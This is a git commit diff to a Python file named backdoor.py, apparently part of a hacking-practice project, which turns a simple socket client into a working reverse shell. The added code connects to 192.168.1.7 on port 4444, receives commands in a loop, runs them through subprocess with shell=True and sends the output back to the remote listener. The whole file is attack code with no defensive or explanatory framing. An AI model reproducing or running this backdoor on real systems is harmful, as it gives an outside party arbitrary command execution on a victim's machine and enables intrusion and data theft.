078761b70109f34128e229a59f1599e379dcbd47
Akshaythulasidharan <akshaythulasidharan@gmail.com>
2020-04-12 16:44:30 -0700

    client

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -1,13 +1,19 @@
 #!/usr/bin/python3
 import socket
+import subprocess
+
+def execute_commands(command):
+    return subprocess.check_output(command,shell=True)
 
 connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection.connect(("192.168.1.7",4444))
 
 msg = "\n[+]connection established\n"
 connection.send(msg.encode('ascii'))
-recieved_data = connection.recv(1024)
-print(recieved_data.decode('ascii'))
 
+while(True):
+    recieved_data = connection.recv(1024).decode()
+    command_result = execute_commands(recieved_data)
+    connection.send(command_result)
 
 connection.close()
